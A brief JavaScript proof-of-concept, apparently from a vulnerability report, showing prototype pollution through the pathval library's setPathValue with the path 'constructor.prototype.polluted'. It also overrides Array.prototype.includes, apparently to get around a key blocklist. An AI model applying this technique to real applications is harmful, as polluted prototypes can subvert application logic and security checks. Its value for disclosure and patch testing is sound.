Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
var pathval = require('pathval');
var obj = {};
console.log({}.polluted);
pathval.setPathValue(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);